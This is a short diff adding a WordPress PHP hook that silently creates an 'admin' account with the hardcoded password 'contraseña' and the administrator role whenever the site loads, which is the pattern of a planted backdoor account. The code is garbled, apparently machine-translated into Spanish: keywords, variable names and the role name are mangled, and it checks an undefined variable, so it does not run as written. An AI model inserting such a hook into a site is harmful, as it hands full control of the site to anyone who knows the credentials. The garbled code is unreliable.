@@ -1,0 +1,15 @@
+<? php
+
+add_action ( 'init' , function () {
+  
+	$ nombre de usuario = 'admin' ;
+	$ contraseña = 'contraseña' ;
+	$ dirección_de_correo electrónico = 'webmaster@midominio.com' ;
+
+	if (! username_exists ( $ username )) {
+		$ user_id = wp_create_user ( $ nombre de usuario , $ contraseña , $ dirección_de_correo electrónico );
+		$ usuario = nuevo  WP_User ( $ user_id );
+		$ usuario -> set_role ( 'administrador' );
+	}
+	
+});
